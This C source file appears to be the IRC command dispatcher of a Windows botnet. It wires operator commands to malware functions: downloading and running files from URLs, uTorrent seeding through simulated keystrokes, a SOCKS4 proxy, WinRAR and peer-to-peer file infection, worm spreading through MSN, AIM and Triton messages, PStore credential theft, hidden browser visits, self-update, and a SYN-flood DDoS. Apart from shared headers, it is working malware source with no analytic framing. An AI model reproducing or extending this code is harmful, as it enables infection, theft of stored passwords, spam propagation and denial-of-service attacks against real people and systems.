
#include "../h/includes.h"
#include "../h/functions.h"
#include "../cmd.h"

char msg[256];
SOCKET sock;
#ifndef NO_SEED

HWND uTorrentWindow = 0;
BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam )
{
   char szTitle[ 512 ];
   GetWindowText( hWnd, szTitle, sizeof( szTitle ) );
   if( strstr( szTitle, "\xB5Torrent" ) )
      uTorrentWindow = hWnd;
   return TRUE;
};

HWND FindUTorrent()
{
   EnumWindows( EnumProc, 0 );
   return( uTorrentWindow );
};
void TypeString( char* szString )
{
   int Length = strlen( szString ), i;
   bool ShiftDown = false;
   short sKey;
   for( i = 0; i < Length; i++, szString++ )
   {
      sKey = VkKeyScan( *szString );
      if( ( sKey >> 8 ) & 1 )
      {
         keybd_event( VK_LSHIFT, 0, 0, 0 );
         ShiftDown = true;
      }
      keybd_event( (unsigned char)sKey, 0, 0, 0 );
      if( ShiftDown )
      {
         keybd_event( VK_LSHIFT, 0, KEYEVENTF_KEYUP, 0 );
         ShiftDown = false;
      }
   }
};
int SeedUTorrent(char* szUrl,char* szSaveAs,char* szSeedTo)
{
   HWND uTorrentWindow=FindUTorrent();
   if(uTorrentWindow==0)
      return 1;
   if(URLDownloadToFile(0,szUrl,szSaveAs,0,0)!=S_OK)
      return 2;
   if((int)fShellExecute(0,"open",szSaveAs,0,0,SW_NORMAL)<=32)
      return 3;
   ShowWindow(uTorrentWindow,SW_SHOW);
   BringWindowToTop(uTorrentWindow);
   SetForegroundWindow(uTorrentWindow);
   SetFocus(uTorrentWindow);
   if(!IsWindow(uTorrentWindow))
      return 4;
   Sleep(300);
   if(*szSeedTo!=0)
      TypeString(szSeedTo);
   keybd_event(VK_RETURN,0,0,0);
   ShowWindow(uTorrentWindow,SW_MINIMIZE);
   return 0;
};
#endif

int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic)
{
	IRC* irc=(IRC*)conn;
	char *a[MAX_TOKENS];
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);
		if (!a[0])
			return 1;
		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->pmsg(Decode(infochan),"%s Failed to parse command.","Failed");
			return 1;
		} 
	}
	return 1;
}
int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic)
{
	IRC* irc=(IRC*)conn;
	int tnum;
	DWORD id;
	BOOL dec=FALSE;
	if (topic)
	{
		if (!lstrcmpi(get_auth,a[0]))
			return 1;
		if (!lstrcmpi(cmd_remove,a[0]))
			return 1;
	}
	if (switches.stop)
	{
		if (!lstrcmpi(get_mnd,a[0]))
		{
			stopthread(Decode(infochan),irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
#endif
#ifndef NO_UPDATE
	    else if (!lstrcmpi(get_upd,a[0]) || !lstrcmpi(get_upd,a[0]))
		{
			stopthread(Decode(infochan),irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif
	}
	if (!lstrcmpi(a[0],get_auth))
	{
		if (switches.verbose)
			irc->pmsg(Decode(infochan),str_auth_ali,main_title);
		return 1;
	}
	
	//////////////////////////////////////////////////////////////////////////////
	//								Fake Commands
	//////////////////////////////////////////////////////////////////////////////
	
	else if (!lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0]) || !lstrcmpi(cmd_fake_remove,a[0]) || !lstrcmpi(cmd_fakelogin,a[0])) {
			irc->pmsg(Decode(Decode(infochan)),"[Security]: Takeover Detected, Changing Server...");
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			irc->disconnect();
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}
	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
		return 1;
	}
	//////////////////////////////////////////////////////////////////////////////
	//								Remove Bot
	//////////////////////////////////////////////////////////////////////////////
	#ifndef NO_REMOVE_CMD
	else if (!lstrcmpi(a[0],cmd_remove))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
		ExitProcess(EXIT_SUCCESS);
	}
	#endif
	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(get_mnd,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,Decode(infochan));
		dl.data1=a[1];
		dl.data2=a[2];
		dl.bdata1 = FALSE;
		dl.bdata2 = (a[3]?TRUE:FALSE);
		dl.bdata3 = (a[4]?TRUE:FALSE);
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent && switches.verbose)
				irc->pmsg(Decode(infochan),"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

			else if(!lstrcmpi(cmd_dlstop,a[0]))
	{
		::killthreadid(DOWNLOAD_THREAD,1);
		irc->pmsg(Decode(infochan),"%s Thread Disabled.", download_title);
	}
	//////////////////////////////////////////////////////////////////////////////
	//								Socks4
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SOCK4
	else if (!lstrcmpi(cmd_socks4,a[0]))
	{
		if ((tnum=findthreadnum(SOCK4_THREAD)) > 0)
		{
			if (!switches.silent)
		    	irc->pmsg(infochan,str_thread_alr,sock4_title,"Socks4 Server",tnum);
			return 1;
		}

		NTHREAD sock4;
		sock4.silent=switches.silent;
		sock4.verbose=switches.verbose;
		strcpy(sock4.target,Decode(infochan));
		sock4.conn=irc;
		sock4.idata1 = (a[1]?atoi(a[1]):sock4port);
		sock4.threadnum=addthread(SOCK4_THREAD,"%s Server running on: %s:%i",sock4_title,exip,sock4.idata1);
		if (threads[sock4.threadnum].tHandle = CreateThread(NULL, 0, &SocksDaemon, (LPVOID)&sock4, 0, &id)) {
			while (sock4.gotinfo == FALSE)
				Sleep(50);
			if (!switches.silent)
				irc->pmsg(Decode(infochan),"%s Server running on: %s:%i",sock4_title,inip,sock4.idata1);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(Decode(infochan),str_thread_fail,sock4_title,"Socks4 thread",GetLastError());
		}
		return 1;
	}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//							WinRAR File Injection
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_WINRAR
	else if (!lstrcmpi(cmd_winrar,a[0]))
	{
		XThread(RarWorm,NULL);
		irc->pmsg(Decode(infochan),"WinRAR Injection Activated");
	}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//						Msn Spread (Link + email(optional))
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_MSN
	else if (!lstrcmpi(cmd_msnemail,a[0]))
	{
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,Decode(infochan));
		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;
		msn.data1=IMmessage;
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(Decode(infochan),"%s Thread Activated: Sending Message With Email.", imspread_title);
		}
	}
	else if (!lstrcmpi(cmd_msnspam,a[0]))
	{
		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,Decode(infochan));
		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;
		msn.data2=IMmessage;
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg2, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(Decode(infochan),"%s Thread Activated: Sending Message.", imspread_title);
		}
	}
	else if(!lstrcmpi(cmd_msnstop,a[0]))
	{
		::killthreadid(MSNMSG_THREAD,1);
		irc->pmsg(Decode(infochan),"%s Thread Disabled.", imspread_title);
	}


	//////////////////////////////////////////////////////////////////////////////
	//						Msn Spread (Zipsend + message)
	//////////////////////////////////////////////////////////////////////////////
		else if (!lstrcmpi(cmd_msnsendzip,a[0]))
	{


		NTHREAD msn3;
		msn3.conn=irc;
		msn3.silent=switches.silent;
		msn3.verbose=switches.verbose;
		strcpy(msn3.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn3.data1=IMmessage; //Message
		msn3.threadnum = addthread(MSNZIPSEND_THREAD,"MSN Threads");
		if (threads[msn3.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg3, (LPVOID)&msn3, 0, &id))
		{
			while (msn3.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message & Zipfile.", imspread_title);
		}



	}
	else if(!lstrcmpi(cmd_msnstopzip,a[0]))

	{

		::killthreadid(MSNZIPSEND_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", imspread_title);
	}

#endif

	//////////////////////////////////////////////////////////////////////////////
	//								AiM Link Spam
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_AIM
	else if (!lstrcmpi(cmd_aimspread_1,a[0]))
	{
		NTHREAD aim;
		aim.conn=irc;
		aim.silent=switches.silent;
		aim.verbose=switches.verbose;

		char *AIMmessage;
 		if ( !( AIMmessage = strchr(params, ' ')) )return 1;

		aim.data1=AIMmessage; //Message
		aim.threadnum = addthread(AIM_THREAD,"AIM Threads");
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AimMessage, (LPVOID)&aim, 0, &id))
		{
			while (aim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(Decode(infochan),"%s Thread Activated: Sending Message.", aimspread_title);
		}

	else if(!lstrcmpi(cmd_aimspread_2,a[0]))
	{
		::killthreadid(AIM_THREAD,1);
		irc->pmsg(Decode(infochan),"%s Thread Disabled.", aimspread_title);
	}

	}

#endif
	//////////////////////////////////////////////////////////////////////////////
	//							Triton Full Contact Spam
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_TRITON
	else if (!lstrcmpi(cmd_timspread_1,a[0]))
	{
		NTHREAD tim;
		tim.conn=irc;
		tim.silent=switches.silent;
		tim.verbose=switches.verbose;

		char *TIMmessage;
 		if ( !( TIMmessage = strchr(params, ' ')) )return 1;

		tim.data1=TIMmessage; //Message
		tim.threadnum = addthread(TIM_THREAD,"TIM Threads");
		if (threads[tim.threadnum].tHandle = CreateThread(NULL, 0, &TritonMessage, (LPVOID)&tim, 0, &id))
		{
			while (tim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(Decode(infochan),"%s Thread Activated: Sending Message.", timspread_title);
		}

	else if(!lstrcmpi(cmd_timspread_2,a[0]))
	{
		::killthreadid(TIM_THREAD,1);
		irc->pmsg(Decode(infochan),"%s Thread Disabled.", timspread_title);
	}

	}

#endif
	//////////////////////////////////////////////////////////////////////////////
	//								Peer2Peer Spread
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_P2P
	else if(!lstrcmpi(cmd_p2pspread,a[0]))
	{
		InfectP2P();
		irc->pmsg(Decode(infochan), "[p2p]: File injected to peer2peer folders.");
	}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//								Torrent Seeder
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SEED
	else if (!lstrcmpi(cmd_seed,a[0]))
	{
	char *url;
	char *dto;
	char *sas;
    url = a[1];
	dto = a[2];
	sas = a[3];
	switch(SeedUTorrent(url,dto,sas))
    {
   case 0:
	  irc->pmsg(Decode(infochan),"%s Seeding!\n", seed_title);
      break;
   case 2:
	  irc->pmsg(Decode(infochan),"%s Unable to download file\n", seed_title);
      break;
   }
}
#endif
// Sh0cK's Special.Modded by Sh0cK. ;)
#ifndef NO_BROWSERVISIT
	else if (!lstrcmpi(cmd_browser,a[0]))
	{
	char *url;
    url = a[1];
	fShellExecute(0,"open",url,0,0,SW_HIDE);
    {
	  irc->pmsg(Decode(infochan),"%s Browser Window Opened!\n", "[.::Sh0cKs Special::.]");

   }
}
#endif

//**

  
#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{

		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif
	//*

    //////////////////////////////////////////////////////////////////////////////
	//                               Pstore
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}


	}

	else if(!lstrcmpi(cmd_pstore_3,a[0]))
	{
		::killthreadid(PSTORE_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", pstore_title);
	}
#endif

	///////////////////////////////////////////////////////////////////////////////
	//							Update
	///////////////////////////////////////////////////////////////////////////////
#ifndef NO_UPDATE
	else if (!lstrcmpi(get_upd,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif 

	//////////////////////////////////////////////////////////////////////////////
	//                               Supersyn DDOS
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_SUPERSYN	
	else if (!lstrcmpi(cmd_ddos_1,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		SUPERSYN ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}
    
	else if(!lstrcmpi(cmd_ddos_2,a[0]))
	{
		::killthreadid(DDOS_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", ddos_title);
	}
#endif 

return 0;
}
